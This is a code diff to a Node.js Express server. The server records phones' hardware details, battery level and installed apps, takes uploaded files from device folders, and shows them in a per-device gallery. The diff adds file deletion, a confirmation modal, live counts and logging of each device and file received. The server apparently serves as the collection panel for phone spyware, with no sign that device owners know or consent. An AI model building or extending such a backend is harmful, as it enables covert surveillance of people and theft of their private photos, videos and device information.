@@ -3,6 +3,7 @@ const fs = require("fs");
 const path = require("path");
 
 const app = express();
+app.use(express.json());
 
 /* ================= CONFIG =================== */
 
@@ -77,6 +78,19 @@ function readLogs() {
       }
     })
     .filter(Boolean);
+}
+
+function writeLogs(entries) {
+  try {
+    const content = entries.map((entry) => JSON.stringify(entry)).join("\n");
+    fs.writeFileSync(LOG_FILE, content ? `${content}\n` : "");
+  } catch {}
+}
+
+function removeFileLogEntries(fileName) {
+  const logs = readLogs();
+  const nextLogs = logs.filter((entry) => !(entry.type === "file" && entry.file === fileName));
+  writeLogs(nextLogs);
 }
 
 function escapeHtml(value) {
@@ -190,6 +204,9 @@ function buildGalleryData(logs) {
   });
 
   files.forEach((file) => {
+    const uploadedPath = path.join(UPLOAD_DIR, file.file || "");
+    if (!file.file || !fs.existsSync(uploadedPath)) return;
+
     const inferred =
       file.device_id ||
       createDeviceId(file.ip, file.device_brand, file.device_model);
@@ -699,7 +716,9 @@ function renderGalleryPage(devices) {
                 : `<div class="file-icon">${escapeHtml(file.icon)}</div>`;
 
               return `
-              <article class="file-card" data-type="${escapeHtml(
+              <article class="file-card" data-file="${escapeHtml(
+                file.file
+              )}" data-type="${escapeHtml(
                 file.typeLabel
               )}" data-search="${escapeHtml(
                 `${device.label} ${folder.name} ${file.original} ${file.typeLabel}`
@@ -725,6 +744,13 @@ function renderGalleryPage(devices) {
                 <div class="file-actions">
                   <a href="${file.fullUrl}" target="_blank" rel="noreferrer">Open</a>
                   <a href="${file.fullUrl}" download>Download</a>
+                  <button
+                    type="button"
+                    class="delete-file-btn"
+                    data-file="${escapeHtml(file.file)}"
+                    data-thumb="${escapeHtml(file.thumb || "")}"
+                    data-name="${escapeHtml(file.original || file.file)}"
+                  >Delete</button>
                 </div>
               </article>
             `;
@@ -734,7 +760,9 @@ function renderGalleryPage(devices) {
           const rows = folder.items
             .map(
               (file) => `
-              <tr class="file-row" data-type="${escapeHtml(file.typeLabel)}" data-search="${escapeHtml(
+              <tr class="file-row" data-file="${escapeHtml(
+                file.file
+              )}" data-type="${escapeHtml(file.typeLabel)}" data-search="${escapeHtml(
                 `${device.label} ${folder.name} ${file.original} ${file.typeLabel}`
               )}">
                 <td>${escapeHtml(file.icon)}</td>
@@ -745,6 +773,13 @@ function renderGalleryPage(devices) {
                 <td class="table-actions">
                   <a href="${file.fullUrl}" target="_blank" rel="noreferrer">Open</a>
                   <a href="${file.fullUrl}" download>Download</a>
+                  <button
+                    type="button"
+                    class="delete-file-btn"
+                    data-file="${escapeHtml(file.file)}"
+                    data-thumb="${escapeHtml(file.thumb || "")}"
+                    data-name="${escapeHtml(file.original || file.file)}"
+                  >Delete</button>
                 </td>
               </tr>
             `
@@ -799,8 +834,8 @@ function renderGalleryPage(devices) {
             </p>
           </div>
           <div class="device-stats">
-            <div><strong>${device.files.length}</strong><span>Files</span></div>
-            <div><strong>${device.folders.length}</strong><span>Folders</span></div>
+            <div><strong class="device-file-count">${device.files.length}</strong><span>Files</span></div>
+            <div><strong class="device-folder-count">${device.folders.length}</strong><span>Folders</span></div>
           </div>
         </div>
 
@@ -808,7 +843,7 @@ function renderGalleryPage(devices) {
           <div class="folder-links">${folderLinks || '<span class="empty-inline">No folders</span>'}</div>
         </div>
 
-        ${folderSections || '<div class="empty-state">No files received for this device yet.</div>'}
+        ${folderSections || '<div class="empty-state">No files received yet.</div>'}
       </section>
     `;
     })
@@ -940,6 +975,89 @@ function renderGalleryPage(devices) {
           padding: 6px 10px;
           cursor: pointer;
           font: inherit;
+        }
+
+        .modal {
+          position: fixed;
+          inset: 0;
+          display: none;
+          align-items: center;
+          justify-content: center;
+          background: rgba(1, 6, 4, 0.7);
+          backdrop-filter: blur(8px);
+          z-index: 50;
+          padding: 20px;
+        }
+
+        .modal.show {
+          display: flex;
+        }
+
+        .modal-card {
+          width: min(460px, 100%);
+          border-radius: 22px;
+          border: 1px solid rgba(109,255,177,0.24);
+          background:
+            linear-gradient(180deg, rgba(14,22,17,0.98), rgba(7,11,9,0.98));
+          box-shadow: var(--shadow);
+          overflow: hidden;
+        }
+
+        .modal-head,
+        .modal-body,
+        .modal-actions {
+          padding: 18px 20px;
+        }
+
+        .modal-head {
+          border-bottom: 1px solid var(--line);
+        }
+
+        .modal-head h3 {
+          margin: 0 0 6px;
+          text-transform: uppercase;
+          letter-spacing: 0.05em;
+        }
+
+        .modal-body {
+          color: var(--muted);
+          line-height: 1.6;
+        }
+
+        .modal-file {
+          margin-top: 12px;
+          padding: 12px 14px;
+          border-radius: 14px;
+          border: 1px solid rgba(109,255,177,0.14);
+          background: rgba(255,255,255,0.025);
+          color: var(--text);
+          word-break: break-word;
+        }
+
+        .modal-actions {
+          display: flex;
+          justify-content: flex-end;
+          gap: 10px;
+          border-top: 1px solid var(--line);
+        }
+
+        .modal-actions button {
+          border-radius: 12px;
+          padding: 10px 14px;
+          font: inherit;
+          cursor: pointer;
+        }
+
+        .modal-cancel {
+          border: 1px solid var(--line);
+          background: rgba(255,255,255,0.03);
+          color: var(--muted);
+        }
+
+        .modal-delete {
+          border: 1px solid rgba(255, 120, 120, 0.24);
+          background: rgba(255, 120, 120, 0.08);
+          color: #ff9090;
         }
 
         .brand {
@@ -1254,6 +1372,16 @@ function renderGalleryPage(devices) {
           text-decoration: none;
         }
 
+        .file-actions button,
+        .table-actions button {
+          padding: 0;
+          border: none;
+          background: transparent;
+          color: #ff8d8d;
+          cursor: pointer;
+          font: inherit;
+        }
+
         .file-table-wrap {
           display: none;
           margin-top: 14px;
@@ -1409,10 +1537,10 @@ function renderGalleryPage(devices) {
           </div>
 
           <section class="stats-bar">
-            <div class="stat-card"><strong>${devices.length}</strong><span>Devices</span></div>
-            <div class="stat-card"><strong>${totalFolders}</strong><span>Folders</span></div>
-            <div class="stat-card"><strong>${totalImages}</strong><span>Images</span></div>
-            <div class="stat-card"><strong>${totalVideos}</strong><span>Videos</span></div>
+            <div class="stat-card"><strong id="totalDevicesCount">${devices.length}</strong><span>Devices</span></div>
+            <div class="stat-card"><strong id="totalFoldersCount">${totalFolders}</strong><span>Folders</span></div>
+            <div class="stat-card"><strong id="totalImagesCount">${totalImages}</strong><span>Images</span></div>
+            <div class="stat-card"><strong id="totalVideosCount">${totalVideos}</strong><span>Videos</span></div>
           </section>
 
           <section class="toolbar">
@@ -1457,6 +1585,23 @@ function renderGalleryPage(devices) {
         </aside>
       </div>
 
+      <div class="modal" id="deleteModal" aria-hidden="true">
+        <div class="modal-card">
+          <div class="modal-head">
+            <h3>Delete File</h3>
+            <small class="eyebrow">This action removes the file, thumbnail, and log entry.</small>
+          </div>
+          <div class="modal-body">
+            <div>Confirm delete for the selected file.</div>
+            <div class="modal-file" id="deleteModalFile">-</div>
+          </div>
+          <div class="modal-actions">
+            <button type="button" class="modal-cancel" id="deleteCancelBtn">Cancel</button>
+            <button type="button" class="modal-delete" id="deleteConfirmBtn">Delete</button>
+          </div>
+        </div>
+      </div>
+
       <script>
         const GALLERY_SIGNATURE = ${JSON.stringify(gallerySignature)};
         const root = document.getElementById("galleryRoot");
@@ -1466,6 +1611,7 @@ function renderGalleryPage(devices) {
         const viewButtons = document.querySelectorAll(".view-toggle button");
         const typeButtons = document.querySelectorAll(".type-toggle button");
         const previewButtons = document.querySelectorAll(".file-preview-trigger");
+        const deleteButtons = document.querySelectorAll(".delete-file-btn");
         const folderSections = document.querySelectorAll(".folder-section");
 
         const previewMedia = document.getElementById("previewMedia");
@@ -1477,25 +1623,34 @@ function renderGalleryPage(devices) {
         const previewSize = document.getElementById("previewSize");
         const previewOpen = document.getElementById("previewOpen");
         const previewDownload = document.getElementById("previewDownload");
+        const totalDevicesCount = document.getElementById("totalDevicesCount");
+        const totalFoldersCount = document.getElementById("totalFoldersCount");
+        const totalImagesCount = document.getElementById("totalImagesCount");
+        const totalVideosCount = document.getElementById("totalVideosCount");
 
         const syncBanner = document.getElementById("syncBanner");
         const refreshNowBtn = document.getElementById("refreshNowBtn");
+        const deleteModal = document.getElementById("deleteModal");
+        const deleteModalFile = document.getElementById("deleteModalFile");
+        const deleteCancelBtn = document.getElementById("deleteCancelBtn");
+        const deleteConfirmBtn = document.getElementById("deleteConfirmBtn");
 
         const state = {
           filter: sessionStorage.getItem("gallery-filter") || "all",
           query: sessionStorage.getItem("gallery-query") || "",
           activeDevice: sessionStorage.getItem("gallery-device") || "",
-          batchSize: 12
+          batchSize: 12,
+          pendingDelete: null
         };
 
         function activateDevice(deviceId) {
           state.activeDevice = deviceId;
           sessionStorage.setItem("gallery-device", deviceId);
-          navButtons.forEach((button) => {
+          document.querySelectorAll(".nav-device").forEach((button) => {
             button.classList.toggle("active", button.dataset.device === deviceId);
           });
 
-          panels.forEach((panel) => {
+          document.querySelectorAll(".device-panel").forEach((panel) => {
             panel.classList.toggle("active", panel.dataset.devicePanel === deviceId);
           });
 
@@ -1525,15 +1680,27 @@ function renderGalleryPage(devices) {
           }
         }
 
+        function resetPreview() {
+          previewName.textContent = "Select a file";
+          previewType.textContent = "Choose any card to inspect details";
+          previewDevice.textContent = "Device: -";
+          previewFolder.textContent = "Folder: -";
+          previewTime.textContent = "Updated: -";
+          previewSize.textContent = "Size: -";
+          previewOpen.href = "#";
+          previewDownload.href = "#";
+          previewMedia.innerHTML = '<div class="file-icon">FILE</div>';
+        }
+
         function resetBatches() {
-          folderSections.forEach((section) => {
+          document.querySelectorAll(".folder-section").forEach((section) => {
             section.dataset.limit = String(state.batchSize);
           });
         }
 
         function applyFilters() {
           const query = state.query.toLowerCase();
-          panels.forEach((panel) => {
+          document.querySelectorAll(".device-panel").forEach((panel) => {
             const isActivePanel = panel.classList.contains("active");
             if (!isActivePanel) return;
 
@@ -1582,24 +1749,104 @@ function renderGalleryPage(devices) {
           });
         }
 
-        navButtons.forEach((button) => {
+        function refreshCounts() {
+          const activePanels = Array.from(document.querySelectorAll(".device-panel"));
+          const activeDevicePanels = activePanels.filter((panel) => panel.querySelector(".file-card, .file-row"));
+
+          if (totalDevicesCount) {
+            totalDevicesCount.textContent = String(activeDevicePanels.length);
+          }
+
+          if (totalFoldersCount) {
+            totalFoldersCount.textContent = String(document.querySelectorAll(".folder-section").length);
+          }
+
+          if (totalImagesCount) {
+            totalImagesCount.textContent = String(document.querySelectorAll('.file-card[data-type="image"]').length);
+          }
+
+          if (totalVideosCount) {
+            totalVideosCount.textContent = String(document.querySelectorAll('.file-card[data-type="video"]').length);
+          }
+
+          document.querySelectorAll(".device-panel").forEach((panel) => {
+            const fileCount = panel.querySelectorAll(".file-card").length;
+            const folderCount = panel.querySelectorAll(".folder-section").length;
+            const fileCountNode = panel.querySelector(".device-file-count");
+            const folderCountNode = panel.querySelector(".device-folder-count");
+            if (fileCountNode) fileCountNode.textContent = String(fileCount);
+            if (folderCountNode) folderCountNode.textContent = String(folderCount);
+          });
+
+          document.querySelectorAll(".nav-device").forEach((button) => {
+            const deviceId = button.dataset.device;
+            const panel = document.querySelector('[data-device-panel="' + CSS.escape(deviceId) + '"]');
+            const count = panel ? panel.querySelectorAll(".file-card").length : 0;
+            const meta = button.querySelector("small");
+            if (meta) {
+              const ip = meta.textContent.split(" • ")[0];
+              meta.textContent = ip + " • " + count + " files";
+            }
+            if (panel && count === 0) {
+              button.remove();
+              panel.remove();
+            }
+          });
+
+          const currentActivePanel = document.querySelector(".device-panel.active");
+          if (!currentActivePanel) {
+            const firstButton = document.querySelector(".nav-device");
+            if (firstButton) {
+              activateDevice(firstButton.dataset.device);
+            }
+          }
+        }
+
+        function removeFileFromUI(fileName) {
+          const relatedCards = Array.from(document.querySelectorAll('.file-card[data-file="' + CSS.escape(fileName) + '"]'));
+          const relatedRows = Array.from(document.querySelectorAll('.file-row[data-file="' + CSS.escape(fileName) + '"]'));
+
+          const previewWasDeleted =
+            previewOpen.href && previewOpen.href.includes("/uploads/" + encodeURIComponent(fileName));
+
+          relatedCards.forEach((card) => {
+            const section = card.closest(".folder-section");
+            card.remove();
+            if (section && section.querySelectorAll(".file-card").length === 0) {
+              section.remove();
+            }
+          });
+
+          relatedRows.forEach((row) => row.remove());
+
+          if (previewWasDeleted) {
+            const fallbackPreview = document.querySelector(".file-preview-trigger");
+            if (fallbackPreview) setPreview(fallbackPreview);
+            else resetPreview();
+          }
+
+          refreshCounts();
+          applyFilters();
+        }
+
+        document.querySelectorAll(".nav-device").forEach((button) => {
           button.addEventListener("click", () => activateDevice(button.dataset.device));
         });
 
-        viewButtons.forEach((button) => {
+        document.querySelectorAll(".view-toggle button").forEach((button) => {
           button.addEventListener("click", () => {
-            viewButtons.forEach((item) => item.classList.toggle("active", item === button));
+            document.querySelectorAll(".view-toggle button").forEach((item) => item.classList.toggle("active", item === button));
             root.classList.toggle("list-view", button.dataset.view === "list");
             applyFilters();
           });
         });
 
-        typeButtons.forEach((button) => {
+        document.querySelectorAll(".type-toggle button").forEach((button) => {
           button.classList.toggle("active", button.dataset.filter === state.filter);
           button.addEventListener("click", () => {
             state.filter = button.dataset.filter;
             sessionStorage.setItem("gallery-filter", state.filter);
-            typeButtons.forEach((item) => item.classList.toggle("active", item === button));
+            document.querySelectorAll(".type-toggle button").forEach((item) => item.classList.toggle("active", item === button));
             resetBatches();
             applyFilters();
           });
@@ -1613,7 +1860,7 @@ function renderGalleryPage(devices) {
           applyFilters();
         });
 
-        folderSections.forEach((section) => {
+        document.querySelectorAll(".folder-section").forEach((section) => {
           section.dataset.limit = String(state.batchSize);
           const loadMoreBtn = section.querySelector(".load-more-btn");
           if (loadMoreBtn) {
@@ -1635,11 +1882,71 @@ function renderGalleryPage(devices) {
             });
           }, { rootMargin: "220px 0px" });
 
-          folderSections.forEach((section) => observer.observe(section));
+          document.querySelectorAll(".folder-section").forEach((section) => observer.observe(section));
         }
 
-        previewButtons.forEach((button) => {
+        document.querySelectorAll(".file-preview-trigger").forEach((button) => {
           button.addEventListener("click", () => setPreview(button));
+        });
+
+        function openDeleteModal(payload) {
+          state.pendingDelete = payload;
+          deleteModalFile.textContent = payload.name || payload.file;
+          deleteModal.classList.add("show");
+          deleteModal.setAttribute("aria-hidden", "false");
+        }
+
+        function closeDeleteModal() {
+          state.pendingDelete = null;
+          deleteModal.classList.remove("show");
+          deleteModal.setAttribute("aria-hidden", "true");
+        }
+
+        document.querySelectorAll(".delete-file-btn").forEach((button) => {
+          button.addEventListener("click", () => {
+            openDeleteModal({
+              file: button.dataset.file,
+              thumb: button.dataset.thumb,
+              name: button.dataset.name || button.dataset.file
+            });
+          });
+        });
+
+        deleteCancelBtn.addEventListener("click", closeDeleteModal);
+        deleteModal.addEventListener("click", (event) => {
+          if (event.target === deleteModal) closeDeleteModal();
+        });
+
+        document.addEventListener("keydown", (event) => {
+          if (event.key === "Escape" && deleteModal.classList.contains("show")) {
+            closeDeleteModal();
+          }
+        });
+
+        deleteConfirmBtn.addEventListener("click", async () => {
+          if (!state.pendingDelete) return;
+
+          try {
+            const response = await fetch("/delete-file", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                file: state.pendingDelete.file,
+                thumb: state.pendingDelete.thumb
+              })
+            });
+
+            if (!response.ok) {
+              window.alert("Delete failed");
+              return;
+            }
+
+            const deletedFile = state.pendingDelete.file;
+            closeDeleteModal();
+            removeFileFromUI(deletedFile);
+          } catch {
+            window.alert("Delete failed");
+          }
         });
 
         function pollForUpdates() {
@@ -1666,10 +1973,11 @@ function renderGalleryPage(devices) {
           state.activeDevice &&
           document.querySelector('[data-device="' + CSS.escape(state.activeDevice) + '"]')
             ? state.activeDevice
-            : (navButtons[0] && navButtons[0].dataset.device);
+            : (document.querySelector(".nav-device") && document.querySelector(".nav-device").dataset.device);
 
         if (defaultDevice) activateDevice(defaultDevice);
-        if (previewButtons[0]) setPreview(previewButtons[0]);
+        const firstPreview = document.querySelector(".file-preview-trigger");
+        if (firstPreview) setPreview(firstPreview);
         applyFilters();
         pollForUpdates();
       </script>
@@ -1693,12 +2001,14 @@ app.post("/track", (req, res) => {
   }
 
   let body = "";
+
   req.on("data", (chunk) => {
     body += chunk.toString();
   });
 
   req.on("end", () => {
     const parsed = parseBody(body);
+
     const allApps = parsed.apps
       ? parsed.apps.split(",").map((appName) => appName.trim()).filter(Boolean)
       : [];
@@ -1727,6 +2037,10 @@ app.post("/track", (req, res) => {
       user_apps: userApps,
       time: new Date().toISOString(),
     };
+
+    console.log(
+      `[DEVICE] ${data.ip} | ${data.brand || "-"} ${data.model || "-"} | Android ${data.android || "-"} | Battery ${data.battery || "-"}% | Apps ${data.app_count}`
+    );
 
     saveLog(data);
     res.json({ status: "ok", device_id: deviceId });
@@ -1764,6 +2078,10 @@ app.post("/upload", (req, res) => {
 
   const thumbName = `thumb_${safeName}`;
   const thumbPath = path.join(THUMB_DIR, thumbName);
+
+  console.log(
+    `[FILE] ${ip} | ${deviceBrand || "-"} ${deviceModel || "-"} | ${folder}/${fileName}`
+  );
 
   const stream = fs.createWriteStream(filePath);
   req.pipe(stream);
@@ -1828,6 +2146,34 @@ app.get("/gallery/live-status", (req, res) => {
     devices: devices.length,
     files: devices.reduce((sum, device) => sum + device.files.length, 0),
   });
+});
+
+app.post("/delete-file", (req, res) => {
+  const fileName = path.basename(req.body?.file || "");
+  const thumbName = path.basename(req.body?.thumb || "");
+
+  if (!fileName) {
+    return res.status(400).json({ status: "error", message: "Missing file name" });
+  }
+
+  const filePath = path.join(UPLOAD_DIR, fileName);
+  const thumbPath = thumbName ? path.join(THUMB_DIR, thumbName) : "";
+
+  try {
+    if (fs.existsSync(filePath)) {
+      fs.unlinkSync(filePath);
+    }
+
+    if (thumbPath && fs.existsSync(thumbPath)) {
+      fs.unlinkSync(thumbPath);
+    }
+
+    removeFileLogEntries(fileName);
+    console.log(`[DELETE] ${fileName}${thumbName ? ` | thumb ${thumbName}` : ""}`);
+    return res.json({ status: "deleted", file: fileName });
+  } catch {
+    return res.status(500).json({ status: "error", message: "Delete failed" });
+  }
 });
 
 /* ================= STATIC ================= */
